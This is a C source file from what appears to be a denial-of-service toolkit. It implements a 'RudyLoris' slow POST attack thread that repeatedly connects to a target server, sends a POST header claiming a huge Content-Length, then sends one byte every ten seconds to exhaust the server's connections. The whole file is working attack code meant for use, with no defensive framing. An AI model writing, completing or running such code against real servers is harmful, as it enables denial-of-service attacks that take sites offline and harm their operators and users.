#include "../../include/elcienco.h"

extern volatile int attack_running;

void *rudyloris_attack(void *arg) {
    ThreadData *data = (ThreadData *)arg;
    AttackConfig cfg = data->config;
    
    printf("[RudyLoris Thread %d] Starting slow POST attack on %s:%d\n",
           data->thread_num, cfg.target, cfg.port);
    
    time_t start_time = time(NULL);
    int connections = 0;
    
    while (attack_running && (time(NULL) - start_time) < cfg.duration) {
        int sock = create_tcp_socket();
        if (sock < 0) {
            usleep(100000);
            continue;
        }
        
        struct sockaddr_in server_addr;
        server_addr.sin_family = AF_INET;
        server_addr.sin_port = htons(cfg.port);
        server_addr.sin_addr.s_addr = inet_addr(cfg.target);
        
        if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) == 0) {
            // Send POST header with huge Content-Length
            char request[2048];
            snprintf(request, sizeof(request),
                "POST /%d HTTP/1.1\r\n"
                "Host: %s\r\n"
                "User-Agent: Mozilla/5.0\r\n"
                "Content-Type: application/x-www-form-urlencoded\r\n"
                "Content-Length: 999999999\r\n"
                "Connection: keep-alive\r\n"
                "\r\n",
                rand(), cfg.target);
            
            send(sock, request, strlen(request), 0);
            
            // Send data very slowly (1 byte per 10 seconds)
            int bytes_sent = 0;
            while (attack_running && bytes_sent < 100 && 
                   (time(NULL) - start_time) < cfg.duration) {
                send(sock, "x", 1, 0);
                bytes_sent++;
                sleep(10); // Slow transmission
            }
            
            connections++;
        }
        
        close(sock);
        
        if (connections % 10 == 0) {
            usleep(100000);
        }
    }
    
    printf("[RudyLoris Thread %d] Finished. Connections: %d\n",
           data->thread_num, connections);
    
    free(data);
    return NULL;
}
